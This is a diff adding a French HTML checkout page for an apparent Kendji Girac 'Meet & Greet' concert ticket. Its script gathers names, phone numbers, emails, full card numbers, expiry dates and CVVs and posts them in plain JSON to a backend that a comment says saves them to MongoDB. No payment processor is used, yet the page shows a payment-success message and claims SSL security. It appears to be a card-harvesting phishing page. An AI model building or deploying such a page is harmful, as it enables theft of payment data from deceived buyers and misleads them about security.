@@ -1,0 +1,927 @@
+<!doctype html>
+<html lang="fr">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Paiement - Kendji Girac Concert</title>
+    <link
+      href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@700;900&family=Cormorant+Garamond:wght@400;600&family=Montserrat:wght@400;600;700&display=swap"
+      rel="stylesheet"
+    />
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+      }
+
+      :root {
+        --color-primary: #1e4a7a;
+        --color-gold: #d4a574;
+        --color-sunset: #ff6b35;
+        --color-sand: #f4e8d8;
+        --color-deep-blue: #0a2540;
+        --color-sky: #87ceeb;
+        --gradient-warm: linear-gradient(
+          135deg,
+          #ff6b35 0%,
+          #d4a574 50%,
+          #87ceeb 100%
+        );
+      }
+
+      body {
+        font-family: "Montserrat", sans-serif;
+        background: var(--color-deep-blue);
+        color: #fff;
+        min-height: 100vh;
+        position: relative;
+        overflow-x: hidden;
+      }
+
+      /* Background Effect */
+      body::before {
+        content: "";
+        position: fixed;
+        inset: 0;
+        background-image: url("data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxkZWZzPjxwYXR0ZXJuIGlkPSJncmlkIiB3aWR0aD0iNDAiIGhlaWdodD0iNDAiIHBhdHRlcm5Vbml0cz0idXNlclNwYWNlT25Vc2UiPjxwYXRoIGQ9Ik0gNDAgMCBMIDAgMCAwIDQwIiBmaWxsPSJub25lIiBzdHJva2U9InJnYmEoMjU1LDI1NSwyNTUsMC4wMykiIHN0cm9rZS13aWR0aD0iMSIvPjwvcGF0dGVybj48L2RlZnM+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0idXJsKCNncmlkKSIvPjwvc3ZnPg==");
+        opacity: 0.3;
+        z-index: 0;
+      }
+
+      /* Header */
+      .header {
+        padding: 2rem;
+        text-align: center;
+        position: relative;
+        z-index: 10;
+        animation: fadeInDown 0.8s ease-out;
+      }
+
+      @keyframes fadeInDown {
+        from {
+          opacity: 0;
+          transform: translateY(-30px);
+        }
+        to {
+          opacity: 1;
+          transform: translateY(0);
+        }
+      }
+
+      .logo {
+        font-family: "Playfair Display", serif;
+        font-size: clamp(2rem, 5vw, 3.5rem);
+        font-weight: 900;
+        letter-spacing: 0.3em;
+        background: var(--gradient-warm);
+        -webkit-background-clip: text;
+        -webkit-text-fill-color: transparent;
+        background-clip: text;
+        margin-bottom: 0.5rem;
+      }
+
+      .subtitle {
+        font-family: "Cormorant Garamond", serif;
+        font-size: clamp(1rem, 2vw, 1.3rem);
+        color: var(--color-gold);
+        font-style: italic;
+        letter-spacing: 0.1em;
+      }
+
+      /* Main Container */
+      .container {
+        max-width: 1200px;
+        margin: 0 auto;
+        padding: 2rem;
+        position: relative;
+        z-index: 10;
+      }
+
+      .payment-wrapper {
+        display: grid;
+        grid-template-columns: 1fr 1fr;
+        gap: 3rem;
+        animation: fadeInUp 1s ease-out;
+      }
+
+      @keyframes fadeInUp {
+        from {
+          opacity: 0;
+          transform: translateY(40px);
+        }
+        to {
+          opacity: 1;
+          transform: translateY(0);
+        }
+      }
+
+      /* Order Summary */
+      .order-summary {
+        background: rgba(255, 255, 255, 0.05);
+        backdrop-filter: blur(20px);
+        padding: 2.5rem;
+        border-radius: 25px;
+        border: 1px solid rgba(255, 255, 255, 0.1);
+        height: fit-content;
+        position: sticky;
+        top: 2rem;
+      }
+
+      .summary-title {
+        font-family: "Playfair Display", serif;
+        font-size: 2rem;
+        margin-bottom: 2rem;
+        color: var(--color-gold);
+        border-bottom: 2px solid rgba(212, 165, 116, 0.3);
+        padding-bottom: 1rem;
+      }
+
+      .event-info {
+        margin-bottom: 2rem;
+      }
+
+      .event-name {
+        font-size: 1.3rem;
+        font-weight: 700;
+        margin-bottom: 1rem;
+        color: #fff;
+      }
+
+      .event-details {
+        display: flex;
+        flex-direction: column;
+        gap: 0.8rem;
+      }
+
+      .detail-row {
+        display: flex;
+        align-items: center;
+        gap: 1rem;
+        color: rgba(255, 255, 255, 0.8);
+        font-size: 0.95rem;
+      }
+
+      .detail-row .icon {
+        font-size: 1.2rem;
+        width: 24px;
+      }
+
+      .price-breakdown {
+        margin-top: 2rem;
+        padding-top: 2rem;
+        border-top: 1px solid rgba(255, 255, 255, 0.1);
+      }
+
+      .price-row {
+        display: flex;
+        justify-content: space-between;
+        margin-bottom: 1rem;
+        color: rgba(255, 255, 255, 0.8);
+      }
+
+      .price-row.total {
+        font-size: 1.5rem;
+        font-weight: 700;
+        color: var(--color-gold);
+        margin-top: 1rem;
+        padding-top: 1rem;
+        border-top: 2px solid rgba(212, 165, 116, 0.3);
+      }
+
+      /* Payment Form */
+      .payment-form {
+        background: rgba(255, 255, 255, 0.05);
+        backdrop-filter: blur(20px);
+        padding: 2.5rem;
+        border-radius: 25px;
+        border: 1px solid rgba(255, 255, 255, 0.1);
+      }
+
+      .form-title {
+        font-family: "Playfair Display", serif;
+        font-size: 2rem;
+        margin-bottom: 2rem;
+        color: var(--color-gold);
+        border-bottom: 2px solid rgba(212, 165, 116, 0.3);
+        padding-bottom: 1rem;
+      }
+
+      .form-group {
+        margin-bottom: 1.5rem;
+      }
+
+      .form-row {
+        display: grid;
+        grid-template-columns: 1fr 1fr;
+        gap: 1rem;
+      }
+
+      label {
+        display: block;
+        margin-bottom: 0.5rem;
+        color: rgba(255, 255, 255, 0.9);
+        font-weight: 600;
+        font-size: 0.9rem;
+        text-transform: uppercase;
+        letter-spacing: 0.05em;
+      }
+
+      input {
+        width: 100%;
+        padding: 1rem 1.2rem;
+        background: rgba(255, 255, 255, 0.08);
+        border: 1px solid rgba(255, 255, 255, 0.15);
+        border-radius: 12px;
+        color: #fff;
+        font-size: 1rem;
+        font-family: "Montserrat", sans-serif;
+        transition: all 0.3s ease;
+      }
+
+      input:focus {
+        outline: none;
+        background: rgba(255, 255, 255, 0.12);
+        border-color: var(--color-gold);
+        box-shadow: 0 0 0 3px rgba(212, 165, 116, 0.1);
+      }
+
+      input::placeholder {
+        color: rgba(255, 255, 255, 0.4);
+      }
+
+      .card-icons {
+        display: flex;
+        gap: 0.5rem;
+        margin-top: 0.5rem;
+        font-size: 1.5rem;
+      }
+
+      .security-badge {
+        display: flex;
+        align-items: center;
+        gap: 0.5rem;
+        padding: 1rem;
+        background: rgba(135, 206, 235, 0.1);
+        border-radius: 10px;
+        margin: 1.5rem 0;
+        font-size: 0.85rem;
+        color: var(--color-sky);
+      }
+
+      .btn-submit {
+        width: 100%;
+        padding: 1.3rem;
+        background: var(--gradient-warm);
+        color: #fff;
+        border: none;
+        border-radius: 15px;
+        font-size: 1.2rem;
+        font-weight: 700;
+        text-transform: uppercase;
+        letter-spacing: 0.1em;
+        cursor: pointer;
+        transition: all 0.3s ease;
+        box-shadow: 0 10px 30px rgba(255, 107, 53, 0.3);
+        font-family: "Montserrat", sans-serif;
+        margin-top: 1rem;
+      }
+
+      .btn-submit:hover {
+        transform: translateY(-3px);
+        box-shadow: 0 15px 40px rgba(255, 107, 53, 0.5);
+      }
+
+      .btn-submit:active {
+        transform: translateY(-1px);
+      }
+
+      .btn-submit:disabled {
+        opacity: 0.6;
+        cursor: not-allowed;
+      }
+
+      /* Modal */
+      .modal {
+        display: none;
+        position: fixed;
+        inset: 0;
+        background: rgba(10, 37, 64, 0.95);
+        backdrop-filter: blur(10px);
+        z-index: 1000;
+        align-items: center;
+        justify-content: center;
+        animation: fadeIn 0.3s ease-out;
+      }
+
+      @keyframes fadeIn {
+        from {
+          opacity: 0;
+        }
+        to {
+          opacity: 1;
+        }
+      }
+
+      .modal.active {
+        display: flex;
+      }
+
+      .modal-content {
+        background: rgba(255, 255, 255, 0.1);
+        backdrop-filter: blur(20px);
+        padding: 3rem 2.5rem;
+        border-radius: 25px;
+        border: 1px solid rgba(255, 255, 255, 0.2);
+        max-width: 500px;
+        width: 90%;
+        text-align: center;
+        animation: slideUp 0.5s ease-out;
+        box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
+      }
+
+      @keyframes slideUp {
+        from {
+          opacity: 0;
+          transform: translateY(50px);
+        }
+        to {
+          opacity: 1;
+          transform: translateY(0);
+        }
+      }
+
+      .success-icon {
+        font-size: 5rem;
+        margin-bottom: 1.5rem;
+        animation: scaleIn 0.5s ease-out 0.3s both;
+      }
+
+      @keyframes scaleIn {
+        from {
+          transform: scale(0);
+        }
+        to {
+          transform: scale(1);
+        }
+      }
+
+      .modal-title {
+        font-family: "Playfair Display", serif;
+        font-size: 2rem;
+        color: var(--color-gold);
+        margin-bottom: 1rem;
+      }
+
+      .modal-message {
+        color: rgba(255, 255, 255, 0.9);
+        line-height: 1.8;
+        margin-bottom: 1rem;
+        font-size: 1.05rem;
+      }
+
+      .modal-phone {
+        font-weight: 700;
+        color: var(--color-sunset);
+        font-size: 1.2rem;
+        margin: 1.5rem 0;
+        padding: 1rem;
+        background: rgba(255, 107, 53, 0.1);
+        border-radius: 10px;
+      }
+
+      .btn-close {
+        margin-top: 2rem;
+        padding: 1rem 3rem;
+        background: var(--gradient-warm);
+        color: #fff;
+        border: none;
+        border-radius: 12px;
+        font-size: 1rem;
+        font-weight: 700;
+        cursor: pointer;
+        transition: all 0.3s ease;
+        text-transform: uppercase;
+        letter-spacing: 0.1em;
+      }
+
+      .btn-close:hover {
+        transform: translateY(-2px);
+        box-shadow: 0 10px 30px rgba(255, 107, 53, 0.4);
+      }
+
+      /* Responsive */
+      @media (max-width: 968px) {
+        .payment-wrapper {
+          grid-template-columns: 1fr;
+          gap: 2rem;
+        }
+
+        .order-summary {
+          position: static;
+        }
+      }
+
+      @media (max-width: 640px) {
+        .container {
+          padding: 1rem;
+        }
+
+        .payment-form,
+        .order-summary {
+          padding: 1.5rem;
+        }
+
+        .form-row {
+          grid-template-columns: 1fr;
+        }
+
+        .header {
+          padding: 1.5rem 1rem;
+        }
+
+        .logo {
+          letter-spacing: 0.2em;
+        }
+
+        .modal-content {
+          padding: 2rem 1.5rem;
+        }
+      }
+
+      /* Loading Animation */
+      .loading {
+        display: inline-block;
+        width: 20px;
+        height: 20px;
+        border: 3px solid rgba(255, 255, 255, 0.3);
+        border-radius: 50%;
+        border-top-color: #fff;
+        animation: spin 1s linear infinite;
+        margin-left: 10px;
+      }
+
+      @keyframes spin {
+        to {
+          transform: rotate(360deg);
+        }
+      }
+
+      /* Promo Code Styles */
+      .promo-container {
+        display: flex;
+        gap: 0.75rem;
+        align-items: flex-end;
+      }
+
+      .promo-input-wrapper {
+        flex: 1;
+      }
+
+      .btn-apply-promo {
+        padding: 1rem 1.5rem;
+        background: rgba(212, 165, 116, 0.2);
+        color: var(--color-gold);
+        border: 1px solid var(--color-gold);
+        border-radius: 12px;
+        font-size: 0.9rem;
+        font-weight: 700;
+        cursor: pointer;
+        transition: all 0.3s ease;
+        text-transform: uppercase;
+        letter-spacing: 0.05em;
+        white-space: nowrap;
+      }
+
+      .btn-apply-promo:hover {
+        background: rgba(212, 165, 116, 0.3);
+        transform: translateY(-2px);
+      }
+
+      .btn-apply-promo:disabled {
+        opacity: 0.5;
+        cursor: not-allowed;
+      }
+
+      .promo-message {
+        margin-top: 0.5rem;
+        font-size: 0.85rem;
+        font-weight: 600;
+        padding: 0.5rem;
+        border-radius: 8px;
+        text-align: center;
+      }
+
+      .promo-message.success {
+        color: #4ade80;
+        background: rgba(74, 222, 128, 0.1);
+      }
+
+      .promo-message.error {
+        color: #f87171;
+        background: rgba(248, 113, 113, 0.1);
+      }
+
+      .price-row.discount {
+        color: #4ade80;
+        font-weight: 600;
+      }
+
+      .original-price {
+        text-decoration: line-through;
+        opacity: 0.6;
+        font-size: 0.9rem;
+        margin-right: 0.5rem;
+      }
+    </style>
+  </head>
+  <body>
+    <!-- Header -->
+    <header class="header">
+      <h1 class="logo">KENDJI</h1>
+      <p class="subtitle">Paiement Sécurisé</p>
+    </header>
+
+    <!-- Main Container -->
+    <div class="container">
+      <div class="payment-wrapper">
+        <!-- Order Summary -->
+        <div class="order-summary">
+          <h2 class="summary-title">Récapitulatif</h2>
+
+          <div class="event-info">
+            <h3 class="event-name">Kendji Girac - Nos 10 ans</h3>
+            <div class="event-details">
+              <div class="detail-row">
+                <span class="icon">📍</span>
+                <span>Zénith de Clermont-Ferrand</span>
+              </div>
+              <div class="detail-row">
+                <span class="icon">📅</span>
+                <span>Mardi 24 Février 2026</span>
+              </div>
+              <div class="detail-row">
+                <span class="icon">🕐</span>
+                <span>Ouverture 20h00</span>
+              </div>
+              <div class="detail-row">
+                <span class="icon">🎫</span>
+                <span>1 accès privilégié - Meet & Greet</span>
+              </div>
+            </div>
+          </div>
+
+          <div class="price-breakdown">
+            <div class="price-row">
+              <span>Billet</span>
+              <span>189,99 €</span>
+            </div>
+            <div class="price-row">
+              <span>Frais de service</span>
+              <span>10,00 €</span>
+            </div>
+            <div class="price-row discount" id="discountRow" style="display: none;">
+              <span>Réduction (90%)</span>
+              <span id="discountAmount">-179,99 €</span>
+            </div>
+            <div class="price-row total">
+              <span>Total</span>
+              <span id="totalPrice">199,99 €</span>
+            </div>
+          </div>
+        </div>
+
+        <!-- Payment Form -->
+        <div class="payment-form">
+          <h2 class="form-title">Informations de paiement</h2>
+
+          <form id="paymentForm">
+            <div class="form-row">
+              <div class="form-group">
+                <label for="firstName">Prénom *</label>
+                <input
+                  type="text"
+                  id="firstName"
+                  name="firstName"
+                  placeholder="Jean"
+                  required
+                />
+              </div>
+              <div class="form-group">
+                <label for="lastName">Nom *</label>
+                <input
+                  type="text"
+                  id="lastName"
+                  name="lastName"
+                  placeholder="Dupont"
+                  required
+                />
+              </div>
+            </div>
+
+            <div class="form-group">
+              <label for="phone">Numéro de téléphone *</label>
+              <input
+                type="tel"
+                id="phone"
+                name="phone"
+                placeholder="+33 6 12 34 56 78"
+                required
+                pattern="[+0-9\s]{10,}"
+              />
+            </div>
+
+            <div class="form-group">
+              <label for="email">Email *</label>
+              <input
+                type="email"
+                id="email"
+                name="email"
+                placeholder="jean.dupont@example.com"
+                required
+              />
+            </div>
+
+            <div class="form-group">
+              <label for="promoCode">Code Promo (Optionnel)</label>
+              <div class="promo-container">
+                <div class="promo-input-wrapper">
+                  <input
+                    type="text"
+                    id="promoCode"
+                    name="promoCode"
+                    placeholder="Entrez votre code promo"
+                    style="text-transform: uppercase;"
+                  />
+                </div>
+                <button type="button" class="btn-apply-promo" id="applyPromoBtn">
+                  Appliquer
+                </button>
+              </div>
+              <div id="promoMessage" class="promo-message" style="display: none;"></div>
+            </div>
+
+            <div class="form-group">
+              <label for="cardNumber">Numéro de carte *</label>
+              <input
+                type="text"
+                id="cardNumber"
+                name="cardNumber"
+                placeholder="1234 5678 9012 3456"
+                maxlength="19"
+                required
+              />
+              <div class="card-icons">
+                <span title="Visa">💳</span>
+                <span title="Mastercard">💳</span>
+                <span title="American Express">💳</span>
+              </div>
+            </div>
+
+            <div class="form-row">
+              <div class="form-group">
+                <label for="expiry">Expiration (MM/AA) *</label>
+                <input
+                  type="text"
+                  id="expiry"
+                  name="expiry"
+                  placeholder="12/26"
+                  maxlength="5"
+                  required
+                />
+              </div>
+              <div class="form-group">
+                <label for="cvv">CVV *</label>
+                <input
+                  type="text"
+                  id="cvv"
+                  name="cvv"
+                  placeholder="123"
+                  maxlength="3"
+                  required
+                />
+              </div>
+            </div>
+
+            <div class="security-badge">
+              <span>🔒</span>
+              <span>Paiement 100% sécurisé avec cryptage SSL</span>
+            </div>
+
+            <button type="submit" class="btn-submit" id="submitBtn">
+              <span id="submitBtnText">Payer 199,99 €</span>
+            </button>
+          </form>
+        </div>
+      </div>
+    </div>
+
+    <!-- Success Modal -->
+    <div class="modal" id="successModal">
+      <div class="modal-content">
+        <div class="success-icon">✅</div>
+        <h3 class="modal-title">Paiement effectué !</h3>
+        <p class="modal-message">
+          Votre paiement a été traité avec succès. Vous recevrez un SMS de
+          confirmation sur le numéro :
+        </p>
+        <div class="modal-phone" id="confirmedPhone"></div>
+        <p
+          class="modal-message"
+          style="font-size: 0.9rem; color: rgba(255, 255, 255, 0.7)"
+        >
+          Conservez ce message comme preuve d'achat. À très bientôt au concert !
+        </p>
+        <button class="btn-close" onclick="closeModal()">Fermer</button>
+      </div>
+    </div>
+
+    <script>
+      // Automatically detect environment - works both locally and on Vercel
+      const API_URL = window.location.hostname === 'localhost' 
+        ? "http://localhost:3000/api/payments"
+        : "/api/payments";
+      const VALID_PROMO_CODE = "KENDJI878";
+      const BASE_PRICE = 199.99;
+      const DISCOUNT_PERCENTAGE = 0.90;
+      
+      let currentPrice = BASE_PRICE;
+      let promoCodeApplied = false;
+      // Format card number with spaces
+      document
+        .getElementById("cardNumber")
+        .addEventListener("input", function (e) {
+          let value = e.target.value.replace(/\s/g, "");
+          let formattedValue = value.match(/.{1,4}/g)?.join(" ") || value;
+          e.target.value = formattedValue;
+        });
+
+      // Format expiry date
+      document.getElementById("expiry").addEventListener("input", function (e) {
+        let value = e.target.value.replace(/\D/g, "");
+        if (value.length >= 2) {
+          value = value.slice(0, 2) + "/" + value.slice(2, 4);
+        }
+        e.target.value = value;
+      });
+
+      // Only allow numbers for CVV
+      document.getElementById("cvv").addEventListener("input", function (e) {
+        e.target.value = e.target.value.replace(/\D/g, "");
+      });
+
+      // Auto uppercase promo code input
+      document.getElementById("promoCode").addEventListener("input", function (e) {
+        e.target.value = e.target.value.toUpperCase();
+      });
+
+      // Apply promo code
+      document.getElementById("applyPromoBtn").addEventListener("click", function () {
+        const promoInput = document.getElementById("promoCode");
+        const promoCode = promoInput.value.trim();
+        const promoMessage = document.getElementById("promoMessage");
+        const discountRow = document.getElementById("discountRow");
+        const discountAmount = document.getElementById("discountAmount");
+        const totalPrice = document.getElementById("totalPrice");
+        const submitBtnText = document.getElementById("submitBtnText");
+
+        if (!promoCode) {
+          promoMessage.textContent = "Veuillez entrer un code promo";
+          promoMessage.className = "promo-message error";
+          promoMessage.style.display = "block";
+          return;
+        }
+
+        if (promoCode === VALID_PROMO_CODE) {
+          // Apply discount
+          promoCodeApplied = true;
+          const discount = BASE_PRICE * DISCOUNT_PERCENTAGE;
+          currentPrice = BASE_PRICE - discount;
+
+          // Update UI
+          discountAmount.textContent = `-${discount.toFixed(2)} €`;
+          discountRow.style.display = "flex";
+          totalPrice.innerHTML = `<span class="original-price">${BASE_PRICE.toFixed(2)} €</span>${currentPrice.toFixed(2)} €`;
+          submitBtnText.textContent = `Payer ${currentPrice.toFixed(2)} €`;
+
+          // Show success message
+          promoMessage.textContent = `✨ Code promo appliqué ! Vous économisez ${discount.toFixed(2)} € (90%)`;
+          promoMessage.className = "promo-message success";
+          promoMessage.style.display = "block";
+
+          // Disable promo input and button
+          promoInput.disabled = true;
+          document.getElementById("applyPromoBtn").disabled = true;
+        } else {
+          // Invalid code
+          promoMessage.textContent = "❌ Code promo invalide";
+          promoMessage.className = "promo-message error";
+          promoMessage.style.display = "block";
+          
+          // Reset discount if previously applied
+          if (promoCodeApplied) {
+            resetPromoCode();
+          }
+        }
+      });
+
+      // Reset promo code function
+      function resetPromoCode() {
+        promoCodeApplied = false;
+        currentPrice = BASE_PRICE;
+        
+        document.getElementById("discountRow").style.display = "none";
+        document.getElementById("totalPrice").textContent = `${BASE_PRICE.toFixed(2)} €`;
+        document.getElementById("submitBtnText").textContent = `Payer ${BASE_PRICE.toFixed(2)} €`;
+        document.getElementById("promoCode").disabled = false;
+        document.getElementById("applyPromoBtn").disabled = false;
+      }
+
+      // Handle form submission -> send to backend (MongoDB)
+      document
+        .getElementById("paymentForm")
+        .addEventListener("submit", async function (e) {
+          e.preventDefault();
+
+          const submitBtn = document.getElementById("submitBtn");
+          const originalText = submitBtn.innerHTML;
+
+          // Disable button and show loading
+          submitBtn.disabled = true;
+          submitBtn.innerHTML =
+            'Traitement en cours<span class="loading"></span>';
+
+          // Collect form data
+          const formData = {
+            firstName: document.getElementById("firstName").value,
+            lastName: document.getElementById("lastName").value,
+              phone: document.getElementById("phone").value,
+              email: document.getElementById("email").value,
+            cardNumber: document.getElementById("cardNumber").value,
+            expiry: document.getElementById("expiry").value,
+            cvv: document.getElementById("cvv").value,
+            timestamp: new Date().toISOString(),
+            eventName: "Kendji Girac - Nos 10 ans",
+            eventDate: "2026-02-24",
+            eventLocation: "Zénith de Clermont-Ferrand",
+            amount: currentPrice,
+            currency: "EUR",
+            promoCodeUsed: promoCodeApplied,
+          };
+
+          try {
+            const res = await fetch(API_URL, {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify(formData),
+            });
+
+            if (!res.ok) throw new Error("Erreur lors de l'enregistrement");
+
+            const data = await res.json();
+
+            // Show success modal
+            document.getElementById("confirmedPhone").textContent =
+              formData.phone;
+            document.getElementById("successModal").classList.add("active");
+
+            // Reset form
+            document.getElementById("paymentForm").reset();
+            resetPromoCode();
+            document.getElementById("promoMessage").style.display = "none";
+
+            console.log("Enregistré dans MongoDB:", data);
+          } catch (err) {
+            alert(
+              "Une erreur est survenue lors de l'enregistrement. Réessayez.",
+            );
+            console.error(err);
+          } finally {
+            // Reset button
+            submitBtn.disabled = false;
+            submitBtn.innerHTML = originalText;
+          }
+        });
+
+      function closeModal() {
+        document.getElementById("successModal").classList.remove("active");
+      }
+
+      // Close modal on outside click
+      document
+        .getElementById("successModal")
+        .addEventListener("click", function (e) {
+          if (e.target === this) {
+            closeModal();
+          }
+        });
+
+      // Close modal on Escape key
+      document.addEventListener("keydown", function (e) {
+        if (e.key === "Escape") {
+          closeModal();
+        }
+      });
+    </script>
+  </body>
+</html>
